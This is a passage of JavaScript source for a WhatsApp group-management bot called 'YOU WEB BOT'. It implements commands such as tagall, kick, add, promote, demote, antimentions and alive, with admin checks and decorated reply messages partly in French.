`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🟢 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐂𝐇𝐄𝐂𝐊𝐁𝐀𝐍*
│. ˚˖𓍢ִ໋✅ ɴᴜᴍᴇʀᴏ ᴀᴄᴛɪғ
│. ˚˖𓍢ִ໋📱 ${target}
│. ˚˖𓍢ִ໋🟢 sᴛᴀᴛᴜs : ᴏɴ ᴡʜᴀᴛsᴀᴘᴘ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`;
    } else {
      reply =
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋☠️ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐂𝐇𝐄𝐂𝐊𝐁𝐀𝐍*
│. ˚˖𓍢ִ໋❌ ɴᴜᴍᴇʀᴏ ɪɴᴀᴄᴛɪғ / ʙᴀɴɴᴇᴅ
│. ˚˖𓍢ִ໋📱 ${target}
│. ˚˖𓍢ִ໋⚠️ sᴛᴀᴛᴜs : ᴅᴇᴀᴅ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`;
    }

    await socket.sendMessage(sender, {
      text: reply
    }, { quoted: shonux });

  } catch (err) {
    console.error('[CHECKBAN CASE ERROR]', err);
    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🛡️ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐂𝐇𝐄𝐂𝐊𝐁𝐀𝐍*
│. ˚˖𓍢ִ໋❌ ᴇʀʀᴇᴜʀ
│. ˚˖𓍢ִ໋📛 ${err.message || err}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
  }
  break;
}
 
 // ANTI STATUT  MENTION
 
case 'antimentions': {

  try {

    const sanitized =
      String(number || "")
        .replace(/[^0-9]/g, "");

    const senderNum =
      (nowsender || "")
        .split("@")[0];

    const ownerNum =
      String(
        config.OWNER_NUMBER || ""
      ).replace(/[^0-9]/g, "");

    // ================= GROUP ONLY =================

    if (!from.endsWith("@g.us")) {

      return await socket.sendMessage(
        from,
        {
          text:
`╭┈┈『 ⚙️ ANTIMENTIONS 』
│
│ ❌ GROUP ONLY
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        },
        { quoted: msg }
      );

    }

    // ================= OWNER CHECK =================

    if (
      senderNum !== sanitized &&
      senderNum !== ownerNum
    ) {

      return await socket.sendMessage(
        from,
        {
          text:
`╭┈┈『 ⚙️ ANTIMENTIONS 』
│
│ ❌ PERMISSION DENIED
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        },
        { quoted: msg }
      );

    }

    // ================= LOAD CONFIG =================

    let cfg =
      await loadUserConfigFromMongo(
        sanitized
      ) || {};

    // ================= DEFAULTS =================

    if (
      typeof cfg.antimentions
      === "undefined"
    ) {

      cfg.antimentions =
        false;

    }

    if (
      typeof cfg.antimentions_threshold
      === "undefined"
    ) {

      cfg.antimentions_threshold =
        2;

    }

    // ================= STATUS =================

    const state =
      cfg.antimentions
        ? "ON 🟢"
        : "OFF 🔴";

    // ================= BUTTONS =================

    const buttons = [

      {
        buttonId:
          cfg.antimentions
            ? "antimentions_off"
            : "antimentions_on",

        buttonText: {

          displayText:
            cfg.antimentions
              ? "⛔ DEACTIVATE"
              : "✅ ACTIVATE"

        },

        type: 1
      }

    ];

    // ================= SEND =================

    await socket.sendMessage(
      from,
      {

        text:
`╭┈┈『 ⚙️ ANTIMENTIONS 』
│
│ 📊 STATUS : ${state}
│ ⚠️ THRESHOLD :
│ ${cfg.antimentions_threshold}
│
│ 🛡️ PROTECTION ENABLED
│ AGAINST MASS MENTIONS
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ

> MADE IN BY YOU TECHX OFC`,

        buttons,

        headerType: 1,

        contextInfo: {

          newsletterJid:
            "120363426341519710@newsletter",

          newsletterName:
            "𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓",

          externalAdReply: {

            title:
              "ᴅєν уσυ ᴀɴᴛɪᴍᴇɴᴛɪᴏɴѕ",

            body:
              "ᴘᴏᴡᴇʀᴇᴅ ʙʏ уσυ тє¢н",

            thumbnailUrl:
              "https://i.postimg.cc/hGD0FkT5/file-00000000ee0c720c90258685675507d2.png",

            mediaType: 1,

            renderLargerThumbnail: true,

            sourceUrl:
              "https://whatsapp.com/channel/120363426341519710"

          }

        }

      },
      { quoted: msg }
    );

  } catch (err) {

    console.error(
      "[ANTIMENTIONS ERROR]",
      err
    );

    await socket.sendMessage(
      from,
      {
        text:
`╭┈┈『 ❌ ERROR 』
│
│ FAILED TO LOAD
│ ANTIMENTIONS SYSTEM
│
│ 📛 ${err.message || err}
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      },
      { quoted: msg }
    );

  }

  break;

}

// ================= BUTTON ON =================

case 'antimentions_on': {

  try {

    const sanitized =
      String(number || "")
        .replace(/[^0-9]/g, "");

    let cfg =
      await loadUserConfigFromMongo(
        sanitized
      ) || {};

    cfg.antimentions =
      true;

    await setUserConfigInMongo(
      sanitized,
      cfg
    );

    await socket.sendMessage(
      from,
      {
        text:
`╭┈┈『 ⚙️ ANTIMENTIONS 』
│
│ ✅ ACTIVATED
│
│ 🛡️ MASS MENTION
│ PROTECTION ENABLED
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`,

        contextInfo: {

          newsletterJid:
            "120363426341519710@newsletter",

          newsletterName:
            "𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓"

        }

      },
      { quoted: msg }
    );

  } catch (e) {

    console.error(
      "ANTIMENTIONS ON ERROR",
      e
    );

  }

  break;

}

// ================= BUTTON OFF =================

case 'antimentions_off': {

  try {

    const sanitized =
      String(number || "")
        .replace(/[^0-9]/g, "");

    let cfg =
      await loadUserConfigFromMongo(
        sanitized
      ) || {};

    cfg.antimentions =
      false;

    await setUserConfigInMongo(
      sanitized,
      cfg
    );

    await socket.sendMessage(
      from,
      {
        text:
`╭┈┈『 ⚙️ ANTIMENTIONS 』
│
│ ⛔ DEACTIVATED
│
│ 📴 MASS MENTION
│ PROTECTION DISABLED
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`,

        contextInfo: {

          newsletterJid:
            "120363426341519710@newsletter",

          newsletterName:
            "𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓"

        }

      },
      { quoted: msg }
    );

  } catch (e) {

    console.error(
      "ANTIMENTIONS OFF ERROR",
      e
    );

  }

  break;

}

// ---------------- CASE tagall ----------------
case 'tagall2': {
  try {

    // ===== REACT =====
    await socket.sendMessage(from, {
      react: { text: "📢", key: msg.key }
    });

    // ===== CHECK GROUP =====
    if (!from.endsWith("@g.us")) {
      return socket.sendMessage(from, {
        text: "❌ group only command"
      }, { quoted: msg });
    }

    const metadata = await socket.groupMetadata(from);
    const participants = metadata.participants || [];

    const msgText = args.join(" ") || "No message";

    // ===== MESSAGE HEADER =====
    let text = `
╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│📢 *𝐀𝐓𝐓𝐄𝐍𝐓𝐈𝐎𝐍 𝐄𝐕𝐄𝐑𝐘𝐎𝐍𝐄*
│
│ *ᴍᴇssᴀɢᴇ :* ${msgText}
│ 👥 *ᴍᴇᴍʙᴇʀs :* ${participants.length}
│
`.trim();

    let mentions = [];

    for (let p of participants) {
      const jid = p.id;
      mentions.push(jid);

      // ===== FIXED BUG HERE (mem → p) =====
      text += `\n│🍂 @${jid.split('@')[0]}`;
    }

    text += `
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
> 📢 *ᴍᴀᴅᴇ ɪɴ ʙʏ ʏᴏᴜ ᴛᴇᴄʜx🌙*`;

    // ===== SEND MESSAGE =====
    await socket.sendMessage(from, {
      image: { url: 'https://files.catbox.moe/0lsjly.png' },
      caption: text,
      mentions: mentions,
      contextInfo: {
        externalAdReply: {
          title: "TAGALL SYSTEM",
          body: "Smart mention system",
          mediaType: 1,
          renderLargerThumbnail: true,
          sourceUrl: "https://whatsapp.com"
        }
      }
    }, { quoted: msg });

  } catch (e) {
    console.error("TAGALL2 ERROR:", e);

    await socket.sendMessage(from, {
      text: "❌ error:\n" + (e.message || e)
    }, { quoted: msg });
  }
}
break;

case 'tagadmins': {
    try {

        if (!isGroup) return reply("❌ This command can only be used in groups.");
        
        const botOwner = conn.user.id.split(":")[0];
        const senderJid = senderNumber + "@s.whatsapp.net";

        let groupInfo = await conn.groupMetadata(from).catch(() => null);
        if (!groupInfo) return reply("❌ Failed to fetch group information.");

        let groupName = groupInfo.subject || "Unknown Group";
        let admins = await getGroupAdmins(participants);
        let totalAdmins = admins ? admins.length : 0;
        if (totalAdmins === 0) return reply("❌ No admins found in this group.");

        let emojis = ['│ •'];
        let randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];

        let message = body.slice(body.indexOf(command) + command.length).trim();
        if (!message) message = "ᴀᴛᴛᴇɴᴛɪᴏɴ ᴀᴅᴍɪɴs";

        let teks = `╭ׂ┄─ׅ─ׂ┄─ׂ┄─ׅ─ׂ┄─ׂ┄─ׅ─ׂ┄──✿
│        『 *\`TAGADMINS\`* 』
│▢ ᴀᴅᴍɪɴs : *${totalAdmins}*
│▢ ᴍᴇssᴀɢᴇ: *${message}*
`;

        for (let admin of admins) {
            if (!admin) continue;
            teks += `${randomEmoji} @${admin.split('@')[0]}\n`;
        }

        teks += "╰ׂ┄─ׅ─ׂ┄─ׂ┄─ׅ─ׂ┄─ׂ┄─ׅ─ׂ┄──✿\n> *𝙼𝙰𝙳𝙴 𝙸𝙽 𝙱𝚈 𝙷𝙴𝙸𝙽𝚉 𝚃𝙴𝙲𝙷*";

        const imageBuffer = await getBuffer("./menu6.jpg");

        await conn.sendMessage(from, {
            image: imageBuffer,
            caption: teks,
            mentions: participants.map(a => a.id),

            contextInfo: {
                mentionedJid: participants.map(a => a.id),

                newsletterJid: "120363426341519710@newsletter",
                newsletterName: "𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓"
            },

            footer: "🤖 YOU WEB BOT",

            buttons: [
                {
                    buttonId: "menu_cmd",
                    buttonText: { displayText: "📋 MENU" },
                    type: 1
                },
                {
                    buttonId: "channel_cmd",
                    buttonText: { displayText: "📢 CHANNEL" },
                    type: 1
                }
            ]

        }, { quoted: mek });

    } catch (e) {
        console.error("TagAdmins Error:", e);
        reply(`❌ *Error Occurred !!*\n\n${e.message || e}`);
    }
}
break;


case 'tagall': {

  if (!from.endsWith('@g.us'))
    break;

  try {

    react("📢");

    // ================= GROUP INFO =================

    const {
      participants,
      groupAdminsJid
    } = await require("./normalize")
      .getGroupAdminsInfo(
        socket,
        from
      );

    // ================= SENDER =================

    const senderJid =
      nowsender ||
      msg.key.participant ||
      msg.key.remoteJid;

    // ================= ADMIN CHECK =================

    if (
      !groupAdminsJid.includes(
        senderJid
      )
    ) {

      react("❌");

      return await socket.sendMessage(
        from,
        {
          text:
`╭┈┈『 ❌ ACCESS DENIED 』
│
│ ONLY GROUP ADMINS
│ CAN USE TAGALL
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        },
        { quoted: msg }
      );

    }

    // ================= MENTIONS =================

    // ✅ FIX: use p.jid || p.id — Baileys may return either field
    const mentions =
      participants
        .map(p => p.jid || p.id)
        .filter(Boolean);

    // ================= MESSAGE =================

    const customMsg =
      args.join(" ").trim() ||
      "ATTENTION EVERYONE 🌟";

    // ================= BUILD TEXT =================

    let teks =
`╭┈┈『 📢 TAGALL GC 』
│
│ 🔔 GROUP NOTIFICATION
│
│ 💬 MESSAGE :
│ ${customMsg}
│
│ 👥 MEMBERS :
│
`;

    // ================= REAL TAG =================

    for (const jid of mentions) {

      teks += `│➤ @${jid.split("@")[0]}\n`;

    }

    teks +=
`│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ

> MADE IN BY YOU TECHX OFC`;

    // ================= SEND =================

    await socket.sendMessage(
      from,
      {

        image: {
          url:
            "https://files.catbox.moe/indcm8.jpg"
        },

        caption:
          teks,

        mentions:
          mentions,

        contextInfo: {

          forwardingScore: 999,
          isForwarded: true,

          forwardedNewsletterMessageInfo: {

            newsletterJid:
              "120363426341519710@newsletter",

            newsletterName:
              "𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓",

            serverMessageId: 143

          },

          mentionedJid:
            mentions,

          externalAdReply: {

            title:
              "ᴅєν уσυ ᴛᴀɢᴀʟʟ",

            body:
              "ᴘᴏᴡᴇʀᴇᴅ ʙʏ уσυ тє¢н",

            thumbnailUrl:
              "https://files.catbox.moe/indcm8.jpg",

            mediaType: 1,

            renderLargerThumbnail: true,

            sourceUrl:
              "https://whatsapp.com/channel/120363426341519710"

          }

        }

      },
      { quoted: msg }
    );

    react("✅");

  } catch (e) {

    console.error(
      "TAGALL ERROR =>",
      e
    );

    react("❌");

    await socket.sendMessage(
      from,
      {
        text:
`╭┈┈『 ❌ ERROR 』
│
│ FAILED TO TAG
│ ALL MEMBERS
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      },
      { quoted: msg }
    );

  }

  break;

}

// ---------------- CASE kick ----------------
case 'kick': {
  if (!from.endsWith('@g.us')) {
    await socket.sendMessage(from, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋👢 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐊𝐈𝐂𝐊*
│. ˚˖𓍢ִ໋❌ ɢʀᴏᴜᴘ ᴏɴʟʏ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
    break;
  }

  try {
    const { groupAdminsJid, botJid } =
      await require('./normalize').getGroupAdminsInfo(socket, from);

    const senderJid = nowsender || msg.key.participant || msg.key.remoteJid;

    if (!groupAdminsJid.includes(senderJid)) {
      await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋👢 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐊𝐈𝐂𝐊*
│. ˚˖𓍢ִ໋❌ ᴀᴅᴍɪɴ ᴏɴʟʏ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
      break;
    }

    if (!botJid || !groupAdminsJid.includes(botJid)) {
      await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋👢 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐊𝐈𝐂𝐊*
│. ˚˖𓍢ִ໋❌ ʙᴏᴛ ɴᴏɴ ᴀᴅᴍɪɴ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
      break;
    }

    const mentions =
      msg?.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];

    if (!mentions.length) {
      await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋👢 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐊𝐈𝐂𝐊*
│. ˚˖𓍢ִ໋📌 ᴜsᴀɢᴇ: .kick @user
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
      break;
    }

    const toRemove = mentions.filter(
      m => !groupAdminsJid.includes(m) && m !== botJid
    );

    if (!toRemove.length) {
      await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋👢 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐊𝐈𝐂𝐊*
│. ˚˖𓍢ִ໋❌ ᴛᴀʀɢᴇᴛ ɪɴᴠᴀʟɪᴅ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
      break;
    }

    await socket.groupParticipantsUpdate(from, toRemove, 'remove');

    await socket.sendMessage(from, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋👢 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐊𝐈𝐂𝐊*
│. ˚˖𓍢ִ໋✅ ʀᴇᴍᴏᴠᴇᴅ
│. ˚˖𓍢ִ໋👤 ${toRemove.map(j => j.split('@')[0]).join(', ')}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`,
      mentions: toRemove
    }, { quoted: msg });

  } catch (e) {
    console.error('KICK ERROR', e);
    await socket.sendMessage(from, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋👢 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐊𝐈𝐂𝐊*
│. ˚˖𓍢ִ໋❌ ᴇʀʀᴇᴜʀ
│. ˚˖𓍢ִ໋📛 ${e.message || e}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
  }

  break;
}

// ---------------- CASE add ----------------
case 'add': {
  if (!from.endsWith('@g.us')) {
    await socket.sendMessage(from, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋➕ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐀𝐃𝐃*
│. ˚˖𓍢ִ໋❌ ɢʀᴏᴜᴘ ᴏɴʟʏ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
    break;
  }

  try {
    const { groupAdminsJid } =
      await require('./normalize').getGroupAdminsInfo(socket, from);

    const senderJid =
      nowsender || msg.key.participant || msg.key.remoteJid;

    if (!groupAdminsJid.includes(senderJid)) {
      await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋➕ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐀𝐃𝐃*
│. ˚˖𓍢ִ໋❌ ᴀᴅᴍɪɴ ᴏɴʟʏ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
      break;
    }

    const number = args[0];
    if (!number) {
      await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋➕ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐀𝐃𝐃*
│. ˚˖𓍢ִ໋📌 ᴜsᴀɢᴇ: .add <numéro>
│. ˚˖𓍢ִ໋💡 ᴇx: .add 509xxxxxxx
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
      break;
    }

    const clean = number.replace(/\D/g, '');
    const jidToAdd = `${clean}@s.whatsapp.net`;

    await socket.groupParticipantsUpdate(from, [jidToAdd], 'add');

    await socket.sendMessage(from, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋➕ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐀𝐃𝐃*
│. ˚˖𓍢ִ໋✅ ᴀᴊᴏᴜᴛé ᴀᴜ ɢʀᴏᴜᴘ
│. ˚˖𓍢ִ໋👤 ${jidToAdd.split('@')[0]}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });

  } catch (e) {
    console.error('ADD ERROR', e);
    await socket.sendMessage(from, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋➕ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐀𝐃𝐃*
│. ˚˖𓍢ִ໋❌ ᴇʀʀᴇᴜʀ
│. ˚˖𓍢ִ໋📛 ${e.message || e}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
  }

  break;
}
// ---------------- CASE promote ----------------
case 'promote': {
  if (!from.endsWith('@g.us')) break;
  try {
    const { groupAdminsJid, botJid } = await require('./normalize').getGroupAdminsInfo(socket, from);
    const senderJid = nowsender || msg.key.participant || msg.key.remoteJid;
    if (!groupAdminsJid.includes(senderJid)) return await socket.sendMessage(from, { text: '❌ Seuls les admins peuvent promouvoir.' }, { quoted: msg });
    if (!botJid || !groupAdminsJid.includes(botJid)) return await socket.sendMessage(from, { text: '❌ Le bot doit être admin.' }, { quoted: msg });

    // ✅ FIX: mentionedJid can be in multiple places depending on message type
    const mentions = msg?.message?.extendedTextMessage?.contextInfo?.mentionedJid
      || msg?.message?.groupMentionedMessage?.contextInfo?.mentionedJid
      || [];
    if (!mentions.length) return await socket.sendMessage(from, { text: '❌ Usage: .promote @membre\nTag le membre à promouvoir.' }, { quoted: msg });

    const toPromote = mentions.filter(m => !groupAdminsJid.includes(m) && m !== botJid);
    if (!toPromote.length) return await socket.sendMessage(from, { text: '❌ Aucune cible valide à promouvoir (déjà admin ?).' }, { quoted: msg });

    react('👑');
    await socket.groupParticipantsUpdate(from, toPromote, 'promote');
    const promotedList = toPromote.map(j => `@${j.split('@')[0]}`).join(', ');
    await socket.sendMessage(from, {
      text: `╭┈┈『 👑 𝐏𝐑𝐎𝐌𝐎𝐓𝐄 』\n│\n│ ✅ Promu avec succès !\n│ 👤 ${promotedList}\n│ 🛡️ Maintenant Admin\n│\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n\n> ${config.BOT_FOOTER}`,
      mentions: toPromote
    }, { quoted: msg });
  } catch (e) {
    react('❌');
    console.error('PROMOTE ERROR', e);
    await socket.sendMessage(from, { text: `❌ Erreur promote: ${e.message || e}` }, { quoted: msg });
  }
  break;
}

// ---------------- CASE demote ----------------
case 'demote': {
  if (!from.endsWith('@g.us')) break;
  try {
    const { groupAdminsJid, botJid } = await require('./normalize').getGroupAdminsInfo(socket, from);
    const senderJid = nowsender || msg.key.participant || msg.key.remoteJid;
    if (!groupAdminsJid.includes(senderJid)) return await socket.sendMessage(from, { text: '❌ Seuls les admins peuvent rétrograder.' }, { quoted: msg });
    if (!botJid || !groupAdminsJid.includes(botJid)) return await socket.sendMessage(from, { text: '❌ Le bot doit être admin.' }, { quoted: msg });

    // ✅ FIX: mentionedJid can be in multiple places depending on message type
    const mentions = msg?.message?.extendedTextMessage?.contextInfo?.mentionedJid
      || msg?.message?.groupMentionedMessage?.contextInfo?.mentionedJid
      || [];
    if (!mentions.length) return await socket.sendMessage(from, { text: '❌ Usage: .demote @membre\nTag le membre à rétrograder.' }, { quoted: msg });

    const toDemote = mentions.filter(m => groupAdminsJid.includes(m) && m !== botJid);
    if (!toDemote.length) return await socket.sendMessage(from, { text: '❌ Aucune cible admin valide à rétrograder (pas admin ?).' }, { quoted: msg });

    react('⬇️');
    await socket.groupParticipantsUpdate(from, toDemote, 'demote');
    const demotedList = toDemote.map(j => `@${j.split('@')[0]}`).join(', ');
    await socket.sendMessage(from, {
      text: `╭┈┈『 ⬇️ 𝐃𝐄𝐌𝐎𝐓𝐄 』\n│\n│ ✅ Rétrogradé avec succès !\n│ 👤 ${demotedList}\n│ 👥 Maintenant Membre\n│\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n\n> ${config.BOT_FOOTER}`,
      mentions: toDemote
    }, { quoted: msg });
  } catch (e) {
    react('❌');
    console.error('DEMOTE ERROR', e);
    await socket.sendMessage(from, { text: `❌ Erreur demote: ${e.message || e}` }, { quoted: msg });
  }
  break;
}

case 'alive': {
  try {

    // ===== REACT =====
    await socket.sendMessage(sender, {
      react: {
        text: "🪭",
        key: msg.key
      }
    });

    const fs = require('fs');

    // ===== IMAGE SAFE LOAD =====
    const imagePath =
      fs.existsSync('./test1.jpg')
        ? './test1.jpg'
        : './menu2.jpg';

    if (!fs.existsSync(imagePath)) {
      return await socket.sendMessage(sender, {
        text: "❌ Image introuvable"
      }, { quoted: msg });
    }

    const buffer = fs.readFileSync(imagePath);

    // ===== UPTIME =====
    const uptime = process.uptime();
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    const seconds = Math.floor(uptime % 60);

    const runtimeText = `${hours}ʜ ${minutes}ᴍ ${seconds}s`;

    // ===== MODE SAFE =====
    const botMode =
      typeof mode !== "undefined"
        ? mode
        : "public";

    // ===== TEXT =====
    const aliveMsg = `
*${toSmallCaps("you md is active")}* 🚀

> ${toSmallCaps("the most powerful and stable bot developed by you tech")}

╭┄┄◆ ${toSmallCaps("you md alive")} ◆
│ ◈ ${toSmallCaps("status")} : ${toSmallCaps("online")}
│ ◈ ${toSmallCaps("runtime")} : ${runtimeText}
│ ◈ ${toSmallCaps("prefix")} : [ ${prefix} ]
│ ◈ ${toSmallCaps("mode")} : ${toSmallCaps(botMode)}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ

*${toSmallCaps("type")} ${prefix}${toSmallCaps("menu")}*
`.trim();

    // ===== BUTTONS =====
    const buttons = [
      {
        buttonId: '.menu',
        buttonText: { displayText: '📋 ᴍᴇɴᴜ' },
        type: 1
      },
      {
        buttonId: '.ping',
        buttonText: { displayText: '🏓 ᴘɪɴɢ' },
        type: 1
      },
      {
        buttonId: '.owner',
        buttonText: { displayText: '👑 ᴏᴡɴᴇʀ' },
        type: 1
      }
    ];

    // ===== SEND STABLE =====
    await socket.sendMessage(sender, {
      image: buffer,
      caption: aliveMsg,
      footer: 'ᴍᴀᴅᴇ ɪɴ ʙʏ ʏᴏᴜ ᴛᴇᴄʜx',
      buttons,
      headerType: 4
    }, { quoted: msg });

  } catch (e) {
    console.error("ALIVE ERROR:", e);

    await socket.sendMessage(sender, {
      text: toSmallCaps("alive failed but bot is online")
    }, { quoted: msg });
  }

  break;
}


case 'revokeall': {
  if (!from.endsWith('@g.us')) break;
  try {
    const { groupAdminsJid } = await require('./normalize').getGroupAdminsInfo(socket, from);
    const senderJid = nowsender || msg.key.participant || msg.key.remoteJid;

    if (!groupAdminsJid.includes(senderJid)) {
      await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐑𝐄𝐕𝐎𝐊𝐄*
│. ˚˖𓍢ִ໋🚫 ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
      break;
    }

    const requests = await socket.groupRequestParticipantsList(from);
    if (!requests || requests.length === 0) {
      await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋ℹ️ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐑𝐄𝐕𝐎𝐊𝐄*
│. ˚˖𓍢ִ໋📭 ɴᴏ ʀᴇǫᴜᴇsᴛs ғᴏᴜɴᴅ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
      break;
    }

    for (const req of requests) {
      await socket.groupRequestParticipantsUpdate(from, [req.jid], 'reject');
    }

    await socket.sendMessage(from, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🚫 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐑𝐄𝐕𝐎𝐊𝐄*
│. ˚˖𓍢ִ໋👥 ${requests.length} ʀᴇǫᴜᴇsᴛs ʀᴇᴊᴇᴄᴛᴇᴅ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });

  } catch (e) {
    console.error('REVOKEALL ERROR', e);
    await socket.sendMessage(from, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐄𝐑𝐑𝐎𝐑*
│. ˚˖𓍢ִ໋⚠️ ᴇʀʀᴏʀ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
  }
  break;
}

// ---------------- CASE mute / unmute ----------------
case 'mute': {
  if (!from.endsWith('@g.us')) break;
  try {
    const { groupAdminsJid } = await require('./normalize').getGroupAdminsInfo(socket, from);
    const senderJid = nowsender || msg.key.participant || msg.key.remoteJid;

    if (!groupAdminsJid.includes(senderJid)) {
      return await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐌𝐔𝐓𝐄*
